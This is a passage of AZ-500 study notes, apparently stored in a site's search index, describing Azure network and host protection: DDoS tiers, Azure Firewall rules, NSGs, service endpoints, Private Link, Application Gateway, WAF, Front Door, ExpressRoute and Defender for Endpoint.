tiers:</p> <ul> <li>Basic: Automatically enabled as part of the Azure platform. Always-on traffic monitoring, and real-time mitigation of common network-level attacks, provide the same defenses utilized by Microsoft's online services. The entire scale of Azure's global network can be used to distribute and mitigate attack traffic across regions. Protection is provided for IPv4 and IPv6 Azure public IP addresses.</li> <li>Standard: Provides additional mitigation capabilities over the Basic service tier that are tuned specifically to Azure Virtual Network resources. DDoS Protection Standard is simple to enable, and requires no application changes. Protection policies are tuned through dedicated traffic monitoring and machine learning algorithms. Policies are applied to public IP addresses associated to resources deployed in virtual networks, such as Azure Load Balancer, Azure Application Gateway, and Azure Service Fabric instances, but this protection does not apply to App Service Environments. Real-time telemetry is available through Azure Monitor views during an attack, and for history. Rich attack mitigation analytics are available via diagnostic settings. Application layer protection can be added through the Azure Application Gateway Web Application Firewall or by installing a 3rd party firewall from Azure Marketplace. Protection is provided for IPv4 and IPv6 Azure public IP addresses.</li> </ul> <p></p> <p>DDoS Protection Standard monitors actual traffic utilization and constantly compares it against the thresholds defined in the DDoS policy. When the traffic threshold is exceeded, DDoS mitigation is automatically initiated. When traffic returns to a level below the threshold, the mitigation is removed. During mitigation, DDoS Protection redirects traffic sent to the protected resource and performs several checks, including: - Helping ensure that packets conform to internet specifications and aren\u2019t malformed. - Interacting with the client to determine if the traffic might be a spoofed packet (for example, using\u00a0<code>SYN Auth</code>\u00a0or\u00a0<code>SYN Cookie</code>\u00a0or dropping a packet for the source to retransmit it). - Using rate-limit packets if it can\u2019t perform any other enforcement meth</p> <p>DDoS Protection blocks attack traffic and forwards the remaining traffic to its intended destination. Within a few minutes of attack detection, you\u2019ll be notified with Azure Monitor metrics. By configuring logging on DDoS Protection Standard telemetry, you can write the logs to available options for future analysis. Azure Monitor retains metric data for DDoS Protection Standard for 30 days.</p> <p>DDoS Protection Standard can mitigate the following types of attacks:</p> <ul> <li>Volumetric attacks: The attack's goal is to flood the network layer with a substantial amount of seemingly legitimate traffic. It includes UDP floods, amplification floods, and other spoofed-packet floods. DDoS Protection Standard mitigates these potential multi-gigabyte attacks by absorbing and scrubbing them, with Azure's global network scale, automatically.</li> <li>Protocol attacks: These attacks render a target inaccessible, by exploiting a weakness in the layer 3 and layer 4 protocol stack. It includes, SYN flood attacks, reflection attacks, and other protocol attacks. DDoS Protection Standard mitigates these attacks, differentiating between malicious and legitimate traffic, by interacting with the client, and blocking malicious traffic.</li> <li>Resource (application) layer attacks: These attacks target web application packets, to disrupt the transmission of data between hosts. The attacks include HTTP protocol violations, SQL injection, cross-site scripting, and other layer 7 attacks. Use a Web Application Firewall, such as the Azure Application Gateway web application firewall, as well as DDoS Protection Standard to provide defense against these attacks. There are also third-party web application firewall offerings available in the Azure Marketplace.</li> </ul> <p>DDoS Protection Standard protects resources in a virtual network including public IP addresses associated with virtual machines, load balancers, and application gateways. When coupled with the Application Gateway web application firewall, or a third-party web application firewall deployed in a virtual network with a public IP, DDoS Protection Standard can provide full layer 3 to layer 7 mitigation capability.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#13-azure-firewall","title":"1.3. Azure Firewall","text":"<p>Azure Firewall\u00a0is a managed, cloud-based network security service that protects your Azure Virtual Network resources. It\u2019s a fully stateful firewall-as-a-service with built-in high availability and unrestricted cloud scalability. By default, Azure Firewall blocks traffic.</p> <ul> <li>Built-in high availability\u00a0- Because high availability is built in, no additional load balancers are required and there\u2019s nothing you need to configure.</li> <li>Unrestricted cloud scalability\u00a0- Azure Firewall can scale up as much as you need, to accommodate changing network traffic flows so you don't need to budget for your peak traffic.</li> <li>Application Fully Qualified Domain Name (FQDN) filtering rules\u00a0- You can limit outbound HTTP/S traffic to a specified list of FQDNs, including wild cards. This feature does not require SSL termination.</li> <li>Network traffic filtering rules\u00a0- You can centrally create allow or deny network filtering rules by source and destination IP address, port, and protocol. Azure Firewall is fully stateful, so it can distinguish legitimate packets for different types of connections. Rules are enforced and logged across multiple subscriptions and virtual networks.</li> <li>Qualified domain tags\u00a0- Fully Qualified Domain Names (FQDN) tags make it easier for you to allow well known Azure service network traffic through your firewall. For example, say you want to allow Windows Update network traffic through your firewall. You create an application rule and include the Windows Update tag. Now network traffic from Windows Update can flow through your firewall.</li> <li>Outbound Source Network Address Translation (OSNAT) support\u00a0- All outbound virtual network traffic IP addresses are translated to the Azure Firewall public IP. You can identify and allow traffic originating from your virtual network to remote internet destinations.</li> <li>Inbound Destination Network Address Translation (DNAT) support\u00a0- Inbound network traffic to your firewall public IP address is translated and filtered to the private IP addresses on your virtual networks.</li> <li>Azure Monitor logging\u00a0- All events are integrated with Azure Monitor, allowing you to archive logs to a storage account, stream events to your Event Hub, or send them to Azure Monitor logs.</li> </ul> <p>Flow of rules for inbound traffic: Grouping the features above into logical groups reveals that Azure Firewall has three rule types:\u00a0NAT rules,\u00a0network rules, and\u00a0application rules. Network rules are applied first, then application rules. Rules are terminating, which means if a match is found in network rules, then application rules are not processed. If there\u2019s no network rule match, and if the packet protocol is HTTP/HTTPS, the packet is then evaluated by the application rules. If no match continues to be found, then the packet is evaluated against the infrastructure rule collection. If there\u2019s still no match, then the packet is denied by default.</p> <p>NAT rules -  Inbound Destination Network Address Translation (DNAT). Filter inbound traffic with Azure Firewall DNAT using the Azure portal. DNAT rules are applied first. If a match is found, an implicit corresponding network rule to allow the translated traffic is added. You can override this behavior by explicitly adding a network rule collection with deny rules that match the translated traffic. No application rules are applied for these connections.</p> <p>Network rules - Grant access from a virtual network. You can configure storage accounts to allow access only from specific VNets. You enable a service endpoint for Azure Storage within the VNet. This endpoint gives traffic an optimal route to the Azure Storage service. The identities of the virtual network and the subnet are also transmitted with each request. Administrators can then configure network rules for the storage account that allow requests to be received from specific subnets in the VNet. Each storage account supports up to 100 virtual network rules, which could be combined with IP network rules.</p> <p>Application rules - Firewall rules to secure Azure Storage   When network rules are configured, only applications requesting data from over the specified set of networks can access a storage account. An application that accesses a storage account when network rules are in effect requires proper authorization on the request. Authorization is supported with Azure AD credentials for blobs and queues, a valid account access key, or a SAS token. By default, storage accounts accept connections from clients on any network. To limit access to selected networks, you must first change the default action. Making changes to network rules can impact your applications' ability to connect to Azure Storage. Setting the default network rule to Deny blocks all access to the data unless specific network rules that grant access are also applied. Be sure to grant access to any allowed networks using network rules before you change the default rule to deny access.</p> <p>Controlling outbound and inbound network access is an important part of an overall network security plan. Network traffic is subjected to the configured firewall rules when you route your network traffic to the firewall as the default gateway.</p> <p>One way you can control outbound network access from an Azure subnet is with Azure Firewall. With Azure Firewall, you can configure:</p> <ul> <li>Application rules that define fully qualified domain names (FQDNs) that can be accessed from a subnet.</li> <li>Network rules that define source address, protocol, destination port, and destination address.</li> </ul> <p>Fully Qualified Domain Name (FQDN) tag: An FQDN tag represents a group of fully qualified domain names (FQDNs) associated with well known Microsoft services. You can use an FQDN tag in application rules to allow the required outbound network traffic through your firewall.</p> <p>Infrastructure qualified domain names: Azure Firewall includes a built-in rule collection for infrastructure FQDNs that are allowed by default. These FQDNs are specific for the platform and can't be used for other purposes. The following services are included in the built-in rule collection:</p> <ul> <li>Compute access to storage Platform Image Repository (PIR)</li> <li>Managed disks status storage access</li> <li>Azure Diagnostics and Logging (MDS)</li> </ul> <p>You can monitor Azure Firewall using firewall logs. You can also use activity logs to audit operations on Azure Firewall resources. You can access some of these logs through the portal. Logs can be sent to Azure Monitor logs, Storage, and Event Hubs and analyzed in Azure Monitor logs or by different tools such as Excel and Power BI. Metrics are lightweight and can support near real-time scenarios making them useful for alerting and fast issue detection.</p> <p>Threat intelligence-based filtering can be enabled for your firewall to alert and deny traffic from/to known malicious IP addresses and domains.  The IP addresses and domains are sourced from the Microsoft Threat Intelligence feed. Intelligent Security Graph powers Microsoft threat intelligence and is used by multiple services including Microsoft Defender for Cloud. If you've enabled threat intelligence-based filtering, the associated rules are processed before any of the NAT rules, network rules, or application rules. You can choose to just log an alert when a rule is triggered, or you can choose alert and deny mode. By default, threat intelligence-based filtering is enabled in alert mode.</p> <p>Rule processing logic: You can configure NAT rules, network rules, and applications rules on Azure Firewall. Rule collections are processed according to the rule type in priority order, lower numbers to higher numbers from 100 to 65,000. A rule collection name can have only letters, numbers, underscores, periods, or hyphens. It must begin with a letter or number, and end with a letter, number or underscore. The maximum name length is 80 characters.</p> <p>Service tags represent a group of IP address prefixes to help minimize complexity for security rule creation. Microsoft manages the address prefixes encompassed by the service tag, and automatically updates the service tag as addresses change. Azure Firewall service tags can be used in the network rules destination field. You can use them in place of specific IP addresses.</p> <p>Remote work support -  Employees aren't protected by the layered security policies associated with on-premises services while working from home. Virtual Desktop Infrastructure (VDI) deployments on Azure can help organizations rapidly respond to this changing environment. However, you need a way to protect inbound/outbound Internet access to and from these VDI deployments. You can use Azure Firewall DNAT rules along with its threat intelligence-based filtering capabilities to protect your VDI deployments. Azure Virtual Desktop is a comprehensive desktop and app virtualization service running in Azure. It\u2019s the only virtual desktop infrastructure (VDI) that delivers simplified management, multi-session Windows 10, optimizations for Microsoft 365 ProPlus, and support for Remote Desktop Services (RDS) environments. </p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#14-configure-vpn-forced-tunneling","title":"1.4. Configure VPN forced tunneling","text":"<p>You configure forced tunneling in Azure via virtual network User Defined Routes (UDR). Redirecting traffic to an on-premises site is expressed as a default route to the Azure VPN gateway. This example uses UDRs to create a routing table to first add a default route and then associate the routing table with your virtual network subnets to enable forced tunneling on those subnets.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#15-create-user-defined-routes-and-network-virtual-appliances","title":"1.5. Create User Defined Routes and Network Virtual Appliances","text":"<p>A User Defined Routes (UDR) is a custom route in Azure that overrides Azure's default system routes or adds routes to a subnet's route table. In Azure, you create a route table and then associate that route table with zero or more virtual network subnets.</p> <p></p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#2-network-security","title":"2. Network security","text":"","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#21-network-security-groups-nsg","title":"2.1. Network Security Groups (NSG)","text":"<p>Network traffic can be filtered to and from Azure resources in an Azure virtual network with a\u00a0network security group. A network security group contains security rules that allow or deny inbound network traffic to, or outbound network traffic from, several types of Azure resources. For each rule, you can specify source and destination, port, and protocol.</p> <p>NSGs control inbound and outbound traffic passing through a network adapter (in the Resource Manager deployment model), a VM (in the classic deployment model), or a subnet (in both deployment models).</p> <p>Network Security Group rules</p> <ul> <li>Name. This is a unique identifier for the rule.</li> <li>Direction. This specifies whether the traffic is inbound or outbound.</li> <li>Priority. If multiple rules match the traffic, rules with a higher priority apply.</li> <li>Access. This specifies whether the traffic is allowed or denied.</li> <li>Source IP address prefix. This prefix identifies where the traffic originated from. It can be based on a single IP address; a range of IP addresses in Classless Interdomain Routing (CIDR) notation; or the asterisk (*), which is a wildcard that matches all possible IP addresses.</li> <li>Source port range. This specifies source ports by using either a single port number from 1 through 65,535; a range of ports (for example, 200\u2013400); or the asterisk (*) to denote all possible ports.</li> <li>Destination IP address prefix. This identifies the traffic destination based on a single IP address, a range of IP addresses in CIDR notation, or the asterisk (*) to match all possible IP addresses.</li> <li>Destination port range. This specifies destination ports by using either a single port number from 1 through 65,535; a range of ports (for example, 200\u2013400); or the asterisk (*) to denote all possible ports.</li> <li>Protocol. This specifies a protocol that matches the rule. It can be UDP, TCP, or the asterisk (*).</li> </ul> <p>Predefined default rules exist for inbound and outbound traffic. You can\u2019t delete these rules, but you can override them, because they have the lowest priority.</p> <p>The default rules allow all inbound and outbound traffic within a virtual network, allow outbound traffic towards the internet, and allow inbound traffic to an Azure load balancer.</p> <p>When you create a custom rule, you can use default tags in the source and destination IP address prefixes to specify predefined categories of IP addresses. These default tags are:</p> <ul> <li>Internet. This tag represents internet IP addresses.</li> <li>Virtual_network. This tag identifies all IP addresses that the IP range for the virtual network defines. It also includes IP address ranges from on-premises networks when they are defined as local network to virtual network.</li> <li>Azure_loadbalancer. This tag specifies the default Azure load balancer destination.</li> </ul> <p>You can design NSGs to isolate virtual networks in security zones, like the model used by on-premises infrastructure does. You can apply NSGs to subnets, which allows you to create protected screened subnets, or DMZs, that can restrict traffic flow to all the machines residing within that subnet. With the classic deployment model, you can also assign NSGs to individual computers to control traffic that is both destined for and leaving the VM. With the Resource Manager deployment model, you can assign NSGs to a network adapter so that NSG rules control only the traffic that flows through that network adapter. If the VM has multiple network adapters, NSG rules won\u2019t automatically be applied to traffic that is designated for other network adapters.</p> <p>Network Security Group limitations</p> <p>When implementing NSGs, these are the limits to keep in mind:</p> <ul> <li>By default, you can create 100 NSGs per region per subscription. You can raise this limit to 400 by contacting Azure support.</li> <li>You can apply only one NSG to a VM, subnet, or network adapter.</li> <li>By default, you can have up to 200 rules in a single NSG. You can raise this limit to 500 by contacting Azure support.</li> <li>You can apply an NSG to multiple resources.</li> </ul> <p>An individual subnet can have zero, or one, associated NSG. An individual network interface can also have zero, or one, associated NSG. So, you can effectively have dual traffic restriction for a virtual machine by associating an NSG first to a subnet, and then another NSG to the VM's network interface. </p> <p>Consider a simple example with one virtual machine as follows:</p> <ul> <li>The virtual machine is placed inside the Contoso Subnet.</li> <li>Contoso Subnet is associated with Subnet NSG.</li> <li> <p>The VM network interface is additionally associated with VM NSG.  </p> <p> </p> </li> </ul> <p>In this example, for inbound traffic, the Subnet NSG is evaluated first. Any traffic allowed through Subnet NSG is then evaluated by VM NSG. The reverse is applicable for outbound traffic, with VM NSG being evaluated first. Any traffic allowed through VM NSG is then evaluated by Subnet NSG.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#22-application-security-groups","title":"2.2. Application Security Groups","text":"<p>In this topic we look at Application Security Groups (ASGs), which are built on network security groups. ASGs enable you to configure network security as a natural extension of an application's structure. You then can group VMs and define network security policies based on those groups.</p> <p>The rules that specify an ASG as the source or destination are only applied to the network interfaces that are members of the ASG. If the network interface is not a member of an ASG, the rule is not applied to the network interface even though the network security group is associated to the subnet.</p> <p>Application security groups have the following constraints</p> <ul> <li>There are limits to the number of ASGs you can have in a subscription, in addition to other limits related to ASGs.</li> <li>You can specify one ASG as the source and destination in a security rule. You cannot specify multiple ASGs in the source or destination.</li> <li>All network interfaces assigned to an ASG must exist in the same virtual network that the first network interface assigned to the ASG is in. For example, if the first network interface assigned to an ASG named AsgWeb is in the virtual network named VNet1, then all subsequent network interfaces assigned to ASGWeb must exist in VNet1. You cannot add network interfaces from different virtual networks to the same ASG.</li> <li>If you specify an ASG as the source and destination in a security rule, the network interfaces in both ASGs must exist in the same virtual network. For example, if AsgLogic contained network interfaces from VNet1, and AsgDb contained network interfaces from VNet2, you could not assign AsgLogic as the source and AsgDb as the destination in a rule. All network interfaces for both the source and destination ASGs need to exist in the same virtual network.</li> </ul>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#23-service-endpoints","title":"2.3. Service Endpoints","text":"<p>A virtual network service endpoint provides the identity of your virtual network to the Azure service. Once service endpoints are enabled in your virtual network, you can secure Azure service resources to your virtual network by adding a virtual network rule to the resources.</p> <p>Today, Azure service traffic from a virtual network uses public IP addresses as source IP addresses. With service endpoints, service traffic switches to use virtual network private addresses as the source IP addresses when accessing the Azure service from a virtual network. This switch allows you to access the services without the need for reserved, public IP addresses used in IP firewalls.</p> <p>Why use a service endpoint?</p> <ul> <li>Improved security for your Azure service resources. Once service endpoints are enabled in your virtual network, you can secure Azure service resources to your virtual network by adding a virtual network rule to the resources. This provides improved security by fully removing public Internet access to resources, and allowing traffic only from your virtual network.</li> <li>Optimal routing for Azure service traffic from your virtual network. Today, any routes in your virtual network that force Internet traffic to your premises and/or virtual appliances, known as forced-tunneling, also force Azure service traffic to take the same route as the Internet traffic. Service endpoints provide optimal routing for Azure traffic.</li> <li>Endpoints always take service traffic directly from your virtual network to the service on the Microsoft Azure backbone network. Keeping traffic on the Azure backbone network allows you to continue auditing and monitoring outbound Internet traffic from your virtual networks, through forced-tunneling, without impacting service traffic.</li> <li>Simple to set up with less management overhead. You no longer need reserved, public IP addresses in your virtual networks to secure Azure resources through IP firewall. There are no NAT or gateway devices required to set up the service endpoints. Service endpoints are configured through a simple click on a subnet. There is no additional overhead to maintaining the endpoints.</li> </ul> <p>Scenarios</p> <ul> <li>Peered, connected, or multiple virtual networks: To secure Azure services to multiple subnets within a virtual network or across multiple virtual networks, you can enable service endpoints on each of the subnets independently, and secure Azure service resources to all of the subnets.</li> <li>Filtering outbound traffic from a virtual network to Azure services: If you want to inspect or filter the traffic sent to an Azure service from a virtual network, you can deploy a network virtual appliance within the virtual network. You can then apply service endpoints to the subnet where the network virtual appliance is deployed, and secure Azure service resources only to this subnet. This scenario might be helpful if you want use network virtual appliance filtering to restrict Azure service access from your virtual network only to specific Azure resources.</li> <li>Securing Azure resources to services deployed directly into virtual networks: You can directly deploy various Azure services into specific subnets in a virtual network. You can secure Azure service resources to managed service subnets by setting up a service endpoint on the managed service subnet.</li> <li>Disk traffic from an Azure virtual machine: Virtual Machine Disk traffic for managed and unmanaged disks isn't affected by service endpoints routing changes for Azure Storage. This traffic includes diskIO as well as mount and unmount. You can limit REST access to page blobs to select networks through service endpoints and Azure Storage network rules.</li> </ul>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#24-private-links","title":"2.4. Private links","text":"<p>Azure Private Link works on an approval call flow model wherein the Private Link service consumer can request a connection to the service provider for consuming the service. The service provider can then decide whether to allow the consumer to connect or not. Azure Private Link enables the service providers to manage the private endpoint connection on their resources</p> <p></p> <p>There are two connection approval methods that a Private Link service consumer can choose from:</p> <ul> <li>Automatic: If the service consumer has RBAC permissions on the service provider resource, the consumer can choose the automatic approval method. In this case, when the request reaches the service provider resource, no action is required from the service provider and the connection is automatically approved.</li> <li>Manual: On the contrary, if the service consumer doesn\u2019t have RBAC permissions on the service provider resource, the consumer can choose the manual approval method. In this case, the connection request appears on the service resources as Pending. The service provider has to manually approve the request before connections can be established. In manual cases, service consumer can also specify a message with the request to provide more context to the service provider.</li> </ul> <p>he service provider has following options to choose from for all Private Endpoint connections:</p> <ul> <li>Approved</li> <li>Reject</li> <li>Remove</li> </ul> <p>Portal is the preferred method for managing private endpoint connections on Azure PaaS resources.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#25-azure-application-gateway","title":"2.5. Azure application gateway","text":"<p>Azure Application Gateway is a web traffic load balancer that enables you to manage traffic to your web applications. Traditional load balancers operate at the transport layer (OSI layer 4 - TCP and UDP) and route traffic based on the source IP address and port to a destination IP address and port.  </p> <p>Application Gateway can make routing decisions based on additional attributes of an HTTP request, for example, URI path or host headers. \u00a0For example, you can route traffic based on the incoming URL. So if /images are in the incoming URL, you can route traffic to a specific set of servers (known as a pool) configured for images. If /video is in the URL, that traffic is routed to another pool that's optimized for videos. This type of routing is known as application layer (OSI layer 7) load balancing.</p> <p>Application Gateway includes the following features:</p> <ul> <li>Secure Sockets Layer (SSL/TLS) termination\u00a0- Application gateway supports SSL/TLS termination at the gateway, after which traffic typically flows unencrypted to the backend servers. This feature allows web servers to be unburdened from costly encryption and decryption overhead.</li> <li>Autoscaling\u00a0- Application Gateway Standard_v2 supports autoscaling and can scale up or down based on changing traffic load patterns. Autoscaling also removes the requirement to choose a deployment size or instance count during provisioning.</li> <li>Zone redundancy\u00a0- A Standard_v2 Application Gateway can span multiple Availability Zones, offering better fault resiliency and removing the need to provision separate Application Gateways in each zone.</li> <li>Static VIP\u00a0- The application gateway Standard_v2 SKU supports static VIP type exclusively. This ensures that the VIP associated with application gateway doesn't change even over the lifetime of the Application Gateway.</li> <li>Web Application Firewall\u00a0- Web Application Firewall (WAF) is a service that provides centralized protection of your web applications from common exploits and vulnerabilities. WAF is based on rules from the OWASP (Open Web Application Security Project) core rule sets 3.1 (WAF_v2 only), 3.0, and 2.2.9.</li> <li>Ingress Controller for AKS\u00a0- Application Gateway Ingress Controller (AGIC) allows you to use Application Gateway as the ingress for an Azure Kubernetes Service (AKS) cluster.</li> <li>URL-based routing\u00a0- URL Path Based Routing allows you to route traffic to back-end server pools based on URL Paths of the request. One of the scenarios is to route requests for different content types to different pool.</li> <li>Multiple-site hosting\u00a0- Multiple-site hosting enables you to configure more than one web site on the same application gateway instance. This feature allows you to configure a more efficient topology for your deployments by adding up to 100 web sites to one Application Gateway (for optimal performance).</li> <li>Redirection\u00a0- A common scenario for many web applications is to support automatic HTTP to HTTPS redirection to ensure all communication between an application and its users occurs over an encrypted path.</li> <li>Session affinity\u00a0- The cookie-based session affinity feature is useful when you want to keep a user session on the same server.</li> <li>Websocket and HTTP/2 traffic\u00a0- Application Gateway provides native support for the WebSocket and HTTP/2 protocols. There's no user-configurable setting to selectively enable or disable WebSocket support.</li> <li>Connection draining\u00a0- Connection draining helps you achieve graceful removal of backend pool members during planned service updates.</li> <li>Custom error pages\u00a0- Application Gateway allows you to create custom error pages instead of displaying default error pages. You can use your own branding and layout using a custom error page.</li> <li>Rewrite HTTP headers\u00a0- HTTP headers allow the client and server to pass additional information with the request or the response.</li> <li>Sizing\u00a0- Application Gateway Standard_v2 can be configured for autoscaling or fixed size deployments. This SKU doesn't offer different instance sizes.</li> </ul> <p>New Application Gateway v1 SKU deployments can take up to 20 minutes to provision. Changes to instance size or count aren't disruptive, and the gateway remains active during this time.</p> <p>Most deployments that use the v2 SKU take around 6 minutes to provision. However it can take longer depending on the type of deployment. For example, deployments across multiple Availability Zones with many instances can take more than 6 minutes.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#26-web-application-firewall","title":"2.6. Web Application Firewall","text":"<p>Web Application Firewall (WAF) provides centralized protection of your web applications from common exploits and vulnerabilities. Web applications are increasingly targeted by malicious attacks that exploit commonly known vulnerabilities. SQL injection and cross-site scripting are among the most common attacks.</p> <p>WAF can be deployed with Azure Application Gateway, Azure Front Door, and Azure Content Delivery Network (CDN) service from Microsoft. WAF on Azure CDN is currently under public preview. WAF has features that are customized for each specific service.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#27-azure-front-door","title":"2.7. Azure Front Door","text":"<p>Azure Front Door enables you to define, manage, and monitor the global routing for your web traffic by optimizing for best performance and instant global failover for high availability. With Front Door, you can transform your global (multi-region) consumer and enterprise applications into robust, high-performance personalized modern applications, APIs, and content that reaches a global audience with Azure.</p> <p>Front Door works at Layer 7 or HTTP/HTTPS layer and uses\u00a0split TCP-based anycast protocol. </p> <p>The following features are included with Front Door:</p> <ul> <li>Accelerate application performance\u00a0- Using split TCP-based anycast protocol, Front Door ensures that your end users promptly connect to the nearest Front Door POP (Point of Presence).</li> <li>Increase application availability with smart health probes\u00a0- Front Door delivers high availability for your critical applications using its smart health probes, monitoring your backends for both latency and availability and providing instant automatic failover when a backend goes down.</li> <li>URL-based routing\u00a0- URL Path Based Routing allows you to route traffic to backend pools based on URL paths of the request. One of the scenarios is to route requests for different content types to different backend pools.</li> <li>Multiple-site hosting\u00a0- Multiple-site hosting enables you to configure more than one web site on the same Front Door configuration.</li> <li>Session affinity\u00a0- The cookie-based session affinity feature is useful when you want to keep a user session on the same application backend.</li> <li>TLS termination\u00a0- Front Door supports TLS termination at the edge that is, individual users can set up a TLS connection with Front Door environments instead of establishing it over long haul connections with the application backend.</li> <li>Custom domains and certificate management\u00a0- When you use Front Door to deliver content, a custom domain is necessary if you would like your own domain name to be visible in your Front Door URL.</li> <li>Application layer security\u00a0- Azure Front Door allows you to author custom Web Application Firewall (WAF) rules for access control to protect your HTTP/HTTPS workload from exploitation based on client IP addresses, country code, and http parameters.</li> <li>URL redirection\u00a0- With the strong industry push on supporting only secure communication, web applications are expected to automatically redirect any HTTP traffic to HTTPS.</li> <li>URL rewrite\u00a0- Front Door supports URL rewrite by allowing you to configure an optional Custom Forwarding Path to use when constructing the request to forward to the backend.</li> <li>Protocol support - IPv6 and HTTP/2 traffic\u00a0- Azure Front Door natively supports end-to-end IPv6 connectivity and HTTP/2 protocol.</li> </ul> <p>As mentioned above, routing to the Azure Front Door environments leverages Anycast for both DNS (Domain Name System) and HTTP (Hypertext Transfer Protocol) traffic, so user traffic will go to the closest environment in terms of network topology (fewest hops). This architecture typically offers better round-trip times for end users (maximizing the benefits of Split TCP). Front Door organizes its environments into primary and fallback \"rings\". The outer ring has environments that are closer to users, offering lower latencies. The inner ring has environments that can handle the failover for the outer ring environment in case an issue happens. The outer ring is the preferred target for all traffic, but the inner ring is necessary to handle traffic overflow from the outer ring. In terms of VIPs (Virtual Internet Protocol addresses), each frontend host, or domain served by Front Door is assigned a primary VIP, which is announced by environments in both the inner and outer ring, as well as a fallback VIP, which is only announced by environments in the inner ring.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#28-expressroute","title":"2.8. ExpressRoute","text":"<p>ExpressRoute\u00a0is a direct, private connection from your WAN (not over the public Internet) to Microsoft Services, including Azure. Site-to-Site VPN traffic travels encrypted over the public Internet. Being able to configure Site-to-Site VPN and ExpressRoute connections for the same virtual network has several advantages.</p> <p>You can configure a Site-to-Site VPN as a secure failover path for ExpressRoute, or use Site-to-Site VPNs to connect to sites that are not part of your network, but that are connected through ExpressRoute. Notice that this configuration requires two virtual network gateways for the same virtual network, one using the gateway type 'Vpn', and the other using the gateway type 'ExpressRoute'.</p> <p></p> <p>IPsec over ExpressRoute for Virtual WAN</p> <p>Azure Virtual WAN uses an Internet Protocol Security (IPsec) Internet Key Exchange (IKE) VPN connection from your on-premises network to Azure over the private peering of an Azure ExpressRoute circuit. This technique can provide an encrypted transit between the on-premises networks and Azure virtual networks over ExpressRoute, without going over the public internet or using public IP addresses. The following diagram shows an example of VPN connectivity over ExpressRoute private peering.</p> <p></p> <p>An important aspect of this configuration is routing between the on-premises networks and Azure over both the ExpressRoute and VPN paths. An important aspect of this configuration is routing between the on-premises networks and Azure over both the ExpressRoute and VPN paths.</p> <p>Point-to-point encryption by MACsec -. MACsec is an IEEE standard. It encrypts data at the Media Access control (MAC) level or Network Layer 2. You can use MACsec to encrypt the physical links between your network devices and Microsoft's network devices when you connect to Microsoft via ExpressRoute Direct. MACsec is disabled on ExpressRoute Direct ports by default. You bring your own MACsec key for encryption and store it in Azure Key Vault. You decide when to rotate the key.</p> <p>End-to-end encryption by IPsec and MACsec. -  IPsec is an IETF standard. It encrypts data at the Internet Protocol (IP) level or Network Layer 3. You can use IPsec to encrypt an end-to-end connection between your on-premises network and your virtual network (VNET) on Azure. MACsec secures the physical connections between you and Microsoft. IPsec secures the end-to-end connection between you and your virtual networks on Azure. You can enable them independently.</p> <p>ExpressRoute Direct gives you the ability to connect directly into Microsoft\u2019s global network at peering locations strategically distributed across the world. ExpressRoute Direct provides dual 100 Gbps or 10 Gbps connectivity, which supports Active/Active connectivity at scale</p> <p>Key features that ExpressRoute Direct provides include, but aren't limited to:</p> <ul> <li>Massive Data Ingestion into services like Storage and Cosmos DB</li> <li>Physical isolation for industries that are regulated and require dedicated and isolated connectivity like: Banking, Government, and Retail</li> <li>Granular control of circuit distribution based on business unit</li> </ul> <p>ExpressRoute Direct supports massive data ingestion scenarios into Azure storage and other big data services. ExpressRoute circuits on 100 Gbps ExpressRoute Direct now also support 40 Gbps and 100 Gbps circuit SKUs. The physical port pairs are 100 or 10 Gbps only and can have multiple virtual circuits.</p> <p>ExpressRoute Direct supports both QinQ and Dot1Q VLAN tagging.</p> <ul> <li>QinQ VLAN Tagging\u00a0allows for isolated routing domains on a per ExpressRoute circuit basis. Azure dynamically allocates an S-Tag at circuit creation and cannot be changed. Each peering on the circuit (Private and Microsoft) will utilize a unique C-Tag as the VLAN. The C-Tag is not required to be unique across circuits on the ExpressRoute Direct ports.</li> <li>Dot1Q VLAN Tagging\u00a0allows for a single tagged VLAN on a per ExpressRoute Direct port pair basis. A C-Tag used on a peering must be unique across all circuits and peerings on the ExpressRoute Direct port pair.</li> </ul> <p>ExpressRoute Direct provides the same enterprise-grade SLA with Active/Active redundant connections into the Microsoft Global Network. ExpressRoute infrastructure is redundant and connectivity into the Microsoft Global Network is redundant and diverse and scales accordingly with customer requirements.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#3-host-security","title":"3. Host security","text":"","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#31-endpoint-protection","title":"3.1. Endpoint protection","text":"<p>Microsoft Defender for Endpoint is an enterprise endpoint security platform designed to help enterprise networks prevent, detect, investigate, and respond to advanced threats.</p> <p>The capabilities on non-Windows platforms may be different from the ones for Windows.</p> <p>Defender for Endpoint uses the following combination of technology built into Windows 10 and Microsoft's robust cloud service:</p> <ul> <li>Endpoint behavioral sensors: Embedded in Windows 10, these sensors collect and process behavioral signals from the operating system and send this sensor data to your private, isolated cloud instance of Microsoft Defender for Endpoint.</li> <li>Cloud security analytics: Leveraging big data, device learning, and unique Microsoft optics across the Windows ecosystem, enterprise cloud products (such as Office 365), and online assets, behavioral signals are translated into insights, detections, and recommended responses to advanced threats.</li> <li>Threat intelligence: Generated by Microsoft hunters, security teams, and augmented by threat intelligence provided by partners, threat intelligence enables Defender for Endpoint to identify attacker tools, techniques, and procedures and generate alerts when they are observed in collected sensor data.</li> </ul> <p>Some features of Microsoft Defender for Endpoint:</p> <p>Core Defender Vulnerability Management - Built-in core vulnerability management capabilities use a modern risk-based approach to the discovery, assessment, prioritization, and 